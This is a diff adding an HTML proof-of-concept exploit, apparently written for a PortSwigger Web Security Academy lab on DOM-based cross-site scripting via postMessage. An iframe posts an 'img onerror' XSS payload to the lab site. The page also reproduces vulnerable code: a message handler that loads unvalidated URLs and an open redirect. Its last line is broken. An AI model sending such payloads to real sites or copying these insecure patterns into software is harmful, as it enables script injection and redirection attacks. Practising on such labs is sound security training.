@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Document</title>
+</head>
+<body>
+    <div>
+        原始页面
+    </div>
+    <iframe src="https://0af700ca04c020c18160e88d00e5004c.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=alert(1)')">
+
+    </iframe>
+</body>
+    <script>
+        window.addEventListener('message', function(e) {
+            var iframe = document.createElement('iframe'), ACMEplayer = {
+                element: iframe
+            }, d;
+            document.body.appendChild(iframe);
+            try {
+                d = JSON.parse(e.data);
+            } catch (e) {
+                return;
+            }
+            switch (d.type) {
+            case "page-load":
+                ACMEplayer.element.scrollIntoView();
+                break;
+            case "load-channel":
+                ACMEplayer.element.src = d.url;
+                break;
+            case "player-height-changed":
+                ACMEplayer.element.style.width = d.width + "px";
+                ACMEplayer.element.style.height = d.height + "px";
+                break;
+            }
+        }, false);
+
+        returnUrl = /url=(https?:\/\/.+)/.exec(location); 
+        if(returnUrl)
+            location.href = returnUrl[1];
+        else 
+            location.href = "/";
+
+        var test = "//".exec();
+    </script>
+</html>
